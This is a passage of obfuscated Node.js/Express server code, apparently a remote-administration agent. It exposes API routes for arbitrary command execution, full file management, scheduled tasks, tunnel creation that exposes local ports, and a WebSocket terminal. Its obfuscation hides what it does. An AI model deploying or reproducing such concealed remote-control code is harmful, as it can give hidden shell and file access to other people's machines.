            'BuErF': function (c, d) {
                return c(d);
            },
            'BENIv': function (c, d) {
                return c(d);
            },
            'wIQer': function (c, d) {
                return c === d;
            },
            'OvBke': function (c, d) {
                return c < d;
            },
            'kiKsV': function (c, d) {
                return c === d;
            },
            'NTONM': 'utf-8',
            'HWRah': gy(0x648),
            'vSftM': gy(0x884),
            'QnJXy': function (c, d) {
                return c === d;
            },
            'uXHEd': 'Shutting\x20down...',
            'wyYdP': 'Validating\x20config...',
            'lojDH': gy(0x1a6),
            'hzOgB': gy(0x77b),
            'xNKck': gy(0x55e),
            'oOPTG': gy(0x78b),
            'EVpqP': gy(0x1a4),
            'hirXJ': gy(0x90b),
            'ELVCv': gy(0x6e9),
            'Wsezn': 'Initializing\x20SystemInfoCollector...',
            'KamMl': gy(0x24f),
            'WDmoN': gy(0x669),
            'PUwAF': function (c) {
                return c();
            },
            'ipcmF': gy(0x325),
            'EMjRe': function (c, d, f) {
                return c(d, f);
            },
            'wYGkC': 'Middleware\x20applied,\x20setting\x20up\x20routes...',
            'HYTpE': gy(0x25b),
            'UFVlb': gy(0x555),
            'ZhreA': gy(0x56d),
            'uUEAu': gy(0x52e),
            'yWNJB': gy(0x40d),
            'ueuVB': '/api/work',
            'HzAEK': gy(0x755),
            'utcNm': gy(0x22f),
            'RfwvC': '/api/file',
            'AksAi': '/api/fileraw',
            'KUwrb': gy(0x464),
            'fjBDV': gy(0x8e4),
            'rsdaA': gy(0x5ee),
            'VVmMl': '/api/file/new',
            'BXqPT': '/api/file/zip',
            'xZIOG': '/api/file/unzip',
            'VjpJL': '/api/task/cron',
            'nCXNx': gy(0x7c3),
            'jANvq': gy(0x38f),
            'WqGJt': gy(0x842),
            'uyUpY': '/api/task/onetime/execute',
            'pEVEs': '/api/argo',
            'YVUPU': 'Setting\x20up\x20WebSocket\x20terminal\x20route...',
            'KUpHN': gy(0x169),
            'HeiIh': gy(0x8d6),
            'iyINu': gy(0x197)
        };
    try {
        await a0aU(), a0D[gy(0x925)](gy(0x582)), a0P['merge'](a), a0D[gy(0x925)](b[gy(0x5dc)]), a0P[gy(0x7fc)](), a0D['debug'](b[gy(0x105)]), a0D[gy(0x925)](b['hzOgB']);
        const c = new a0R(a0P[gy(0x7bc)], a0P[gy(0x3b9)]);
        a0D['debug'](b[gy(0x329)]);
        !a0P[gy(0x17a)] && !c[gy(0x889)] && (a0D[gy(0x8e9)](b[gy(0x6b9)]), a0D[gy(0x8e9)](b[gy(0x737)]), process[gy(0x4ec)](0x1));
        a0D[gy(0x925)](b[gy(0x8f9)]);
        const d = new a0Q();
        d[gy(0x62f)] = () => a0P[gy(0x6bd)](), a0D[gy(0x925)](b['ELVCv']), a0D['debug'](b[gy(0x102)]);
        const f = new a0U();
        a0D['debug'](b['KamMl']), a0D[gy(0x925)](b['WDmoN']);
        const g = b['PUwAF'](a0f);
        b[gy(0x498)](a0x, g), a0D[gy(0x925)](b[gy(0x29a)]), g[gy(0x66d)]((l, m, n) => {
            const gz = gy, o = gz(0x930)[gz(0x140)]('|');
            let p = 0x0;
            while (!![]) {
                switch (o[p++]) {
                case '0':
                    m[gz(0x69f)](gz(0x710), '*');
                    continue;
                case '1':
                    m[gz(0x69f)](b[gz(0x5da)], gz(0x535));
                    continue;
                case '2':
                    if (l['method'] === b[gz(0x238)])
                        return a0P[gz(0x17a)] && m[gz(0x50d)](b['wkUag'], b['WzeEY']), m['status'](0xc8)['end']();
                    continue;
                case '3':
                    m[gz(0x69f)](b['jOnKm'], b[gz(0x675)]);
                    continue;
                case '4':
                    m[gz(0x69f)](b[gz(0x2e4)], b[gz(0x564)]);
                    continue;
                case '5':
                    n();
                    continue;
                }
                break;
            }
        }), g[gy(0x66d)](a0f[gy(0x6cc)]({
            'type': l => l[gy(0x312)] !== gy(0x1f7),
            'limit': gy(0x8e4)
        })), g[gy(0x66d)](a0f[gy(0x656)]({ 'extended': !![] })), g['use'](b[gy(0x4b4)](a0T, c, d)), a0D[gy(0x925)](b['wYGkC']), g[gy(0x1f2)](b['HYTpE'], async (l, m) => {
            const gA = gy;
            try {
                const n = await a0P[gA(0x1be)](), o = await a0P[gA(0x924)](n[gA(0x698)] || ''), p = await a0P[gA(0x4b2)](), q = a0U[gA(0x762)](n, o, p);
                b[gA(0x25e)](l['is_authenticated'], !![]) ? (q[gA(0x279)] = a0P[gA(0x78f)], q[gA(0x912)] = a0P[gA(0x601)]) : (q[gA(0x279)] = null, q[gA(0x912)] = null), m['json'](q), b[gA(0x693)](a0P['KMODE'], '1') && a0aN['onBaseinfoSuccess']();
            } catch (r) {
                m[gA(0x59c)](0x1f4)[gA(0x80b)]({
                    'status': 'error',
                    'message': r[gA(0x49d)]
                });
            }
        }), g[gy(0x1f2)](b[gy(0x553)], (l, m) => {
            const gB = gy;
            let n = a0P[gB(0x647)];
            if (b[gB(0x2b8)](l['query']['ttl'], undefined)) {
                const s = b['BQTBO'](parseInt, l[gB(0x53a)][gB(0x905)], 0xa);
                if (Number[gB(0x1a0)](s) || b[gB(0x7f3)](s, 0x1) || s > a0P[gB(0x70e)])
                    return m[gB(0x59c)](0x1a6)[gB(0x80b)]({ 'error': gB(0x6dd) + a0P[gB(0x70e)] });
                n = s;
            }
            const o = typeof l[gB(0x53a)]['format'] === b[gB(0x7fd)] ? l[gB(0x53a)][gB(0x21e)][gB(0x63e)]()[gB(0x1a2)]() : '';
            let p;
            if (b[gB(0x114)](o, '') || b['Rocdh'](o, 'full'))
                p = b['kitEJ'];
            else {
                if (b[gB(0x1c6)](o, b[gB(0x4a3)]))
                    p = b[gB(0x4a3)];
                else
                    return m[gB(0x59c)](0x1a6)[gB(0x80b)]({ 'error': b[gB(0x264)] });
            }
            const q = d[gB(0x2f7)](n), r = u => new Date(u * 0x3e8)[gB(0x907)]()[gB(0x655)](gB(0x3d6), 'Z');
            m['json']({
                'status': 'ok',
                'key_id': q[gB(0x5ad)],
                'ttl_seconds': q[gB(0x5de)],
                'created_at': b[gB(0x899)](r, q[gB(0x280)]),
                'expires_at': b[gB(0x899)](r, q[gB(0x66b)]),
                'ecdsa': b[gB(0x693)](p, b[gB(0x4a3)]) ? {
                    'private_key': q['ecdsa_private_hex'],
                    'public_key': q['ecdsa_public_b64']
                } : {
                    'private_key': q['ecdsa_private_key'][gB(0x63e)](),
                    'public_key': q[gB(0x208)][gB(0x63e)]()
                },
                'ecies': b['XNctB'](p, b['DIDLR']) ? {
                    'private_key': q[gB(0x8b8)],
                    'public_key': q['ecies_public_b64']
                } : {
                    'private_key': q[gB(0x8b8)],
                    'public_key': q['ecies_public_key']
                }
            });
        }), g[gy(0x1f2)](b[gy(0x751)], async (l, m) => {
            const gD = gy, n = {
                    'VHvNJ': function (o, p) {
                        const gC = a0b;
                        return b[gC(0x55d)](o, p);
                    },
                    'POTNq': b['AEplN']
                };
            try {
                const o = Math['floor'](Date['now']() / 0x3e8);
                !a0P[gD(0x7f2)] || b[gD(0x8b7)](o - a0P[gD(0x725)], a0P['STATUS_CACHE_TTL']) ? (!a0P[gD(0x276)] && (a0P[gD(0x276)] = f[gD(0x420)]()['then'](q => {
                    const gE = gD, r = gE(0x8ca)[gE(0x140)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0P[gE(0x725)] = Math['floor'](n[gE(0x8a1)](Date[gE(0x855)](), 0x3e8));
                            continue;
                        case '1':
                            a0P[gE(0x7f2)] = q;
                            continue;
                        case '2':
                            a0P[gE(0x276)] = null;
                            continue;
                        case '3':
                            return q;
                        case '4':
                            a0D[gE(0x925)](n[gE(0x90f)]);
                            continue;
                        }
                        break;
                    }
                })[gD(0x7ea)](q => {
                    const gF = gD;
                    a0P[gF(0x276)] = null;
                    throw q;
                })), await a0P[gD(0x276)]) : a0D[gD(0x925)](b[gD(0x19d)]);
                const p = { ...a0P['_status_cache'] };
                m[gD(0x80b)](p);
            } catch (q) {
                m[gD(0x59c)](0x1f4)[gD(0x80b)]({
                    'status': b['xAeMV'],
                    'message': q[gD(0x49d)]
                });
            }
        });
        const h = async (l, m) => {
            const gG = gy;
            try {
                let n = null;
                if (b[gG(0xfd)](typeof l['body'], b['FoNie']))
                    n = l[gG(0x411)][gG(0x63e)]();
                else
                    l[gG(0x411)] && b['glYUf'](typeof l[gG(0x411)], 'object') && (n = l[gG(0x411)][gG(0x3b3)] || '');
                if (!n)
                    return m[gG(0x59c)](0x190)['json']({
                        'status': b[gG(0x4be)],
                        'message': gG(0x166)
                    });
                const o = await a0V[gG(0x6da)](n, {
                    'cwd': l[gG(0x411)]['cwd'],
                    'env': l[gG(0x411)]['env'],
                    'timeout': a0P[gG(0x351)]
                });
                m[gG(0x80b)](o);
            } catch (p) {
                m[gG(0x59c)](0x1f4)[gG(0x80b)]({
                    'status': b[gG(0x4be)],
                    'message': p[gG(0x49d)]
                });
            }
        };
        g['post'](b['uUEAu'], h);
        for (const l of [
                b[gy(0x22c)],
                gy(0x85f),
                b[gy(0x753)]
            ]) {
            g[gy(0x191)](l, h);
        }
        g['post'](b[gy(0x1bd)], async (m, n) => {
            const gH = gy;
            try {
                const o = await a0Y['listFiles'](m[gH(0x411)][gH(0x312)], m[gH(0x411)][gH(0x253)]);
                n[gH(0x80b)]({
                    'status': 'ok',
                    'count': o[gH(0x7a3)],
                    'files': o
                });
            } catch (p) {
                n[gH(0x59c)](0x1f4)[gH(0x80b)]({
                    'status': b[gH(0x4be)],
                    'message': p[gH(0x49d)]
                });
            }
        }), g['post'](b[gy(0x69c)], async (m, n) => {
            const gI = gy;
            try {
                const o = await a0Y[gI(0x703)](m[gI(0x411)][gI(0x3a4)] || []);
                n[gI(0x80b)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)[gI(0x80b)]({
                    'status': 'error',
                    'message': p[gI(0x49d)]
                });
            }
        }), g[gy(0x5fd)](b['utcNm'], async (m, n) => {
            const gJ = gy;
            try {
                const o = m[gJ(0x411)][gJ(0xee)] || {}, p = b[gJ(0x25e)](m[gJ(0x411)][gJ(0x253)], !![]), q = await a0Y[gJ(0x5dd)](o, p);
                n[gJ(0x80b)](q);
            } catch (r) {
                n[gJ(0x59c)](0x1f4)['json']({
                    'status': b[gJ(0x4be)],
                    'message': r[gJ(0x49d)]
                });
            }
        }), g[gy(0x191)](gy(0x298), async (m, n) => {
            const gK = gy;
            try {
                const o = await a0Y[gK(0x321)](m['body'][gK(0x312)]);
                n[gK(0x80b)](o);
            } catch (p) {
                n[gK(0x59c)](0x1f4)[gK(0x80b)]({
                    'status': 'error',
                    'message': p[gK(0x49d)]
                });
            }
        }), g[gy(0x191)](b[gy(0x886)], async (m, n) => {
            const gL = gy;
            try {
                const o = await a0Y[gL(0x4f4)](m[gL(0x411)][gL(0x312)], m['body'][gL(0x524)], m[gL(0x411)][gL(0x6e5)], m['body'][gL(0x2e3)], m[gL(0x411)][gL(0x40f)]);
                n[gL(0x80b)](o);
            } catch (p) {
                n['status'](0x1f4)[gL(0x80b)]({
                    'status': gL(0x8e9),
                    'message': p[gL(0x49d)]
                });
            }
        }), g[gy(0x191)](b[gy(0x4cb)], a0f[gy(0x3e1)]({
            'type': b['KUwrb'],
            'limit': b[gy(0x1ff)]
        }), async (m, n) => {
            const gM = gy;
            try {
                const o = b[gM(0x3af)](decodeURIComponent, m[gM(0x6a2)][gM(0x687)] || ''), p = decodeURIComponent(m[gM(0x6a2)][b['nCZlK']] || ''), q = m[gM(0x6a2)][b[gM(0x290)]], r = m['headers'][b[gM(0x1e5)]];
                if (!o || !p)
                    return n[gM(0x59c)](0x190)[gM(0x80b)]({
                        'status': gM(0x8e9),
                        'completed': ![],
                        'message': b[gM(0x41b)]
                    });
                const s = b[gM(0x2b8)](q, undefined) ? parseInt(b[gM(0x5b5)](String, q), 0xa) : null, t = b[gM(0x2d1)](r, undefined) ? b['CCKqR'](parseInt, b['juuot'](String, r), 0xa) : null, u = m[gM(0x411)];
                if (!Buffer[gM(0x7d4)](u))
                    return n[gM(0x59c)](0x190)[gM(0x80b)]({
                        'status': b[gM(0x4be)],
                        'completed': ![],
                        'message': b[gM(0xf8)]
                    });
                const v = await a0Y[gM(0x846)](o, p, u, s, t);
                n[gM(0x80b)](v);
            } catch (w) {
                n['status'](0x1f4)['json']({
                    'status': b[gM(0x4be)],
                    'completed': ![],
                    'message': w['message']
                });
            }
        }), g[gy(0x191)]('/api/file/download', async (m, n) => {
            const gN = gy;
            try {
                const o = await a0Y[gN(0x257)](m[gN(0x411)][gN(0x312)]);
                return n[gN(0x50d)](b[gN(0x4df)], o[gN(0x8fe)]['toString']()), n[gN(0x50d)](b[gN(0x2bc)], o['path']), n[gN(0x50d)](b[gN(0x92e)], 'application/octet-stream'), n[gN(0x4a9)](o[gN(0x6e5)]);
            } catch (p) {
                n[gN(0x59c)](0x1f4)[gN(0x80b)]({
                    'status': b[gN(0x4be)],
                    'message': p[gN(0x49d)]
                });
            }
        }), g[gy(0x59d)](b[gy(0x886)], async (m, n) => {
            const gO = gy;
            try {
                let o = m[gO(0x411)][gO(0x3a4)];
                if (!o || !Array[gO(0x659)](o)) {
                    o = [];
                    if (m[gO(0x411)][gO(0x312)])
                        o['push'](m[gO(0x411)]['path']);
                    if (m[gO(0x411)][gO(0x6e2)])
                        o[gO(0x75e)](m['body']['path2']);
                }
                const p = await a0Y[gO(0x591)](o);
                n[gO(0x80b)]({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[gO(0x80b)]({
                    'status': b['xAeMV'],
                    'message': q[gO(0x49d)]
                });
            }
        }), g[gy(0x5fd)](b[gy(0x886)], async (m, n) => {
            const gP = gy;
            try {
                const o = await a0Y[gP(0x6e7)](m[gP(0x411)][gP(0x528)] || m[gP(0x411)]);
                n['json']({
                    'status': 'ok',
                    'total': o[gP(0x7a3)],
                    'success': o['filter'](p => p[gP(0x59c)] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[gP(0x59c)](0x1f4)['json']({
                    'status': gP(0x8e9),
                    'message': p[gP(0x49d)]
                });
            }
        }), g[gy(0x191)](b[gy(0x48e)], async (m, n) => {
            const gQ = gy;
            try {
                const o = await a0Y['copyFiles'](m[gQ(0x411)]);
                n[gQ(0x80b)]({
                    'status': 'ok',
                    'total': o[gQ(0x7a3)],
                    'success': o[gQ(0x896)](p => p['status'] === 'ok')[gQ(0x7a3)],
                    'results': o
                });
            } catch (p) {
                n[gQ(0x59c)](0x1f4)[gQ(0x80b)]({
                    'status': b[gQ(0x4be)],
                    'message': p['message']
                });
            }
        }), g[gy(0x191)](b[gy(0x33b)], async (m, n) => {
            const gR = gy;
            try {
                const o = await a0Y[gR(0x1e0)](m[gR(0x411)][gR(0x312)]);
                n['json'](o);
            } catch (p) {
                n['status'](0x1f4)[gR(0x80b)]({
                    'status': b[gR(0x4be)],
                    'message': p['message']
                });
            }
        }), g['post'](b[gy(0x5d3)], async (m, n) => {
            const gS = gy;
            try {
                const o = m[gS(0x411)] || {};
                if (!o[gS(0x312)])
                    return n['status'](0x190)[gS(0x80b)]({ 'error': b[gS(0x51c)] });
                if (!Array[gS(0x659)](o['items']) || b['IIqeV'](o['items'][gS(0x7a3)], 0x0))
                    return n[gS(0x59c)](0x190)[gS(0x80b)]({ 'error': b[gS(0x19b)] });
                const p = await a0Y[gS(0x18e)](o[gS(0x312)], o[gS(0x7ce)], !!o[gS(0x686)]);
                n[gS(0x80b)](p);
            } catch (q) {
                const r = /Access denied/['test'](q[gS(0x49d)]) ? 0x193 : 0x190;
                n['status'](r)['json']({
                    'status': gS(0x8e9),
                    'message': q[gS(0x49d)]
                });
            }
        }), g['post'](b['xZIOG'], async (m, n) => {
            const gT = gy;
            try {
                const o = m[gT(0x411)] || {};
                if (!o['path'])
                    return n[gT(0x59c)](0x190)[gT(0x80b)]({ 'error': b['AQEys'] });
                const p = await a0Y['unzipArchive'](o[gT(0x312)], o[gT(0x795)], b['uwxFF'](o[gT(0x1c8)], ![]), Array[gT(0x659)](o[gT(0x4b8)]) ? o[gT(0x4b8)] : null);
                n['json'](p);
            } catch (q) {
                const r = /Access denied/[gT(0x731)](q[gT(0x49d)]) ? 0x193 : 0x190;
                n[gT(0x59c)](r)['json']({
                    'status': 'error',
                    'message': q[gT(0x49d)]
                });
            }
        }), g[gy(0x1f2)](gy(0x752), (m, n) => {
            const gU = gy;
            n[gU(0x80b)](a0a0[gU(0x8e7)]());
        }), g['post'](gy(0x752), async (m, n) => {
            const gV = gy;
            try {
                const o = await a0a0[gV(0x71f)](m[gV(0x411)]);
                n[gV(0x80b)](o);
            } catch (p) {
                n[gV(0x59c)](0x1f4)['json']({
                    'status': gV(0x8e9),
                    'message': p[gV(0x49d)]
                });
            }
        }), g['get'](b['VjpJL'], (m, n) => {
            const gW = gy;
            n['json'](a0a0[gW(0x833)]());
        }), g[gy(0x191)](b[gy(0x518)], (m, n) => {
            const gX = gy;
            try {
                const o = a0a0[gX(0x861)](m[gX(0x411)]);
                n[gX(0x80b)](o);
            } catch (p) {
                n[gX(0x59c)](0x1f4)['json']({
                    'status': gX(0x8e9),
                    'message': p[gX(0x49d)]
                });
            }
        }), g[gy(0x1f2)](gy(0x6c2), (m, n) => {
            const gY = gy;
            n[gY(0x80b)](a0a0[gY(0x3fd)]());
        }), g[gy(0x1f2)](b[gy(0x2f5)], (m, n) => {
            const gZ = gy;
            let o = b[gZ(0x57d)](parseInt, m[gZ(0x53a)][gZ(0x127)], 0xa) || 0x32;
            o = Math[gZ(0x5df)](Math[gZ(0x434)](o, 0x1), 0x64), n['json'](a0a0['getOnetimeLogs'](o));
        }), g[gy(0x1f2)](b['jANvq'], (m, n) => {
            const h0 = gy;
            let o = b[h0(0x334)](parseInt, m[h0(0x53a)][h0(0x127)], 0xa) || 0x32;
            o = Math[h0(0x5df)](Math['max'](o, 0x1), 0x64), n[h0(0x80b)](a0a0[h0(0x4ea)](o));
        }), g['delete'](b[gy(0x2f5)], (m, n) => {
            const h1 = gy;
            n[h1(0x80b)](a0a0[h1(0x4fe)]());
        }), g[gy(0x59d)](b[gy(0x772)], (m, n) => {
            const h2 = gy;
            n[h2(0x80b)](a0a0[h2(0x785)]());
        }), g[gy(0x1f2)](b[gy(0x8e5)], (m, n) => {
            const h3 = gy;
            n[h3(0x80b)](a0a0[h3(0x808)]());
        }), g[gy(0x191)](b[gy(0x7c2)], async (m, n) => {
            const h4 = gy;
            try {
                const o = await a0a0[h4(0x384)]();
                n[h4(0x80b)](o);
            } catch (p) {
                n[h4(0x59c)](0x1f4)[h4(0x80b)]({
                    'status': 'error',
                    'message': p[h4(0x49d)]
                });
            }
        });
        const i = {
                'debug': (...m) => a0D[gy(0x925)](m[gy(0x52c)]('\x20')),
                'info': (...m) => a0D[gy(0x281)](m[gy(0x52c)]('\x20')),
                'warning': (...m) => a0D[gy(0x444)](m[gy(0x52c)]('\x20'))
            }, j = new a0aM(i);
        g[gy(0x1f2)](b[gy(0x6d1)], (m, n) => {
            const h5 = gy, o = j[h5(0x7b0)]();
            n[h5(0x80b)]({
                'status': 'ok',
                'count': o[h5(0x7a3)],
                'tunnels': o
            });
        }), g[gy(0x191)](b[gy(0x6d1)], async (m, n) => {
            const h6 = gy;
            try {
                const o = b[h6(0x354)](a0aL, m[h6(0x411)]);
                let p = o['port'];
                (b[h6(0x1e9)](p, undefined) || b[h6(0x114)](p, null) || b['aTpxj'](p, '')) && (p = a0P[h6(0x338)]);
                const q = Number(p);
                if (!Number['isInteger'](q) || q < 0x1 || b[h6(0x8b7)](q, 0xffff))
                    return n[h6(0x59c)](0x1a6)[h6(0x80b)]({
                        'status': b['xAeMV'],
                        'created': ![],
                        'port': p,
                        'message': b[h6(0x32a)]
                    });
                const r = await j['create'](q, o[h6(0x8c3)] === !![]);
                n[h6(0x80b)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[h6(0x33e)],
                    'port': r['port'],
                    'created_at': r[h6(0x632)]
                });
            } catch (s) {
                n[h6(0x59c)](s[h6(0x59c)] || 0x1f4)[h6(0x80b)]({
                    'status': b['xAeMV'],
                    'created': ![],
                    'port': s[h6(0x56b)] ?? null,
                    'message': s[h6(0x49d)]
                });
            }
        }), g[gy(0x59d)](b[gy(0x6d1)], async (m, n) => {
            const h7 = gy;
            try {
                const o = b[h7(0x498)](a0aL, m[h7(0x411)]), p = o[h7(0x56b)], q = b[h7(0x1ea)](Number, p);
                if (b['wIQer'](p, undefined) || b[h7(0x1e9)](p, null) || p === '' || !Number[h7(0x16d)](q) || b[h7(0x7d2)](q, 0x1) || b['Lpwol'](q, 0xffff))
                    return n[h7(0x59c)](0x1a6)['json']({
                        'status': b[h7(0x4be)],
                        'deleted': 0x0,
                        'port': p ?? null,
                        'message': h7(0x22e)
                    });
                const r = await j[h7(0x15c)](q, o[h7(0x60a)]);
                if (b['psAVT'](r[h7(0x59c)], 'ok'))
                    return n['json']({
                        'status': 'ok',
                        'deleted': r[h7(0x255)],
                        'port': q,
                        'tunnels': r[h7(0x348)]
                    });
                return n[h7(0x59c)](r['status'])['json']({
                    'status': h7(0x8e9),
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n[h7(0x59c)](0x1f4)[h7(0x80b)]({
                    'status': h7(0x8e9),
                    'deleted': 0x0,
                    'message': s[h7(0x49d)]
                });
            }
        }), a0D['debug'](b['YVUPU']), g['ws'](gy(0x717), async (m, n) => {
            const h8 = gy, o = n[h8(0x645)][0x0];
            a0D[h8(0x925)](h8(0x768) + n[h8(0x6ce)]), a0D[h8(0x925)](h8(0x4c5) + o);
            const p = n[h8(0x53a)][h8(0x3db)], q = n['query'][h8(0x666)], r = b['wIQer'](n[h8(0x53a)]['meta'], '1'), s = b[h8(0x4fd)](n[h8(0x53a)][h8(0x838)], '1');
            a0D['debug']('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + p);
            if (!p) {
                a0D[h8(0x925)](h8(0x610)), m[h8(0x92b)](0x3f0, 'Missing\x20request_id');
                return;
            }
            if (q) {
                const u = a0P['wsDowngradeToken'](), v = Buffer[h8(0x68c)](b['wBrvY'](String, q), b['NTONM']), w = Buffer[h8(0x68c)](u, b[h8(0x4d7)]), x = v[h8(0x7a3)] === w[h8(0x7a3)] && a0k['timingSafeEqual'](v, w);
                if (!x) {
                    a0D[h8(0x444)](h8(0x179) + p + h8(0x379)), m[h8(0x92b)](0x3f0, b[h8(0x834)]);
                    return;
                }
            }
            const t = new a0aT();
            await t['startSession'](m, p, q, r, s);
        }), a0D[gy(0x925)](b[gy(0x7cf)]), a0a0[gy(0x877)](), a0D[gy(0x925)](b['HeiIh']);
        const k = g[gy(0x61f)](a0P[gy(0x338)], a0P[gy(0x500)], () => {
            const h9 = gy;
            a0D[h9(0x925)](h9(0x662) + a0P[h9(0x8fb)] + h9(0x113) + a0P['HOST'] + ':' + a0P['PORT']), a0D[h9(0x925)](b[h9(0x562)]), (a0P['KMODE'] === '1' || b[h9(0x5d7)](a0P[h9(0x682)], '2') && a0aN['knameValid']()) && a0aN[h9(0x6d8)](j);
        });
        process['on'](b['iyINu'], () => {
            const ha = gy;
            a0D[ha(0x925)](b[ha(0x153)]), k[ha(0x92b)](), process[ha(0x4ec)](0x0);
        }), a0D[gy(0x925)](gy(0x811));
    } catch (m) {
        a0D['error'](gy(0x765), m), process[gy(0x4ec)](0x1);
    }
}
(require[a0aY(0x6ee)] === module || require[a0aY(0x6ee)]?.[a0aY(0x524)]?.[a0aY(0x4f6)](a0aY(0x595))) && a0aV()[a0aY(0x7ea)](a0D[a0aY(0x8e9)]);
module[a0aY(0x426)] = {
    'main': a0aV,
    'loadCurves': a0aU,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0a0,
    'TaskStore': a0Z,
    'ArgoTunnelManager': a0aM,
    'KModeController': a0aN,
    'ZipArchiver': a0X,
    'TempKeyManager': a0Q
};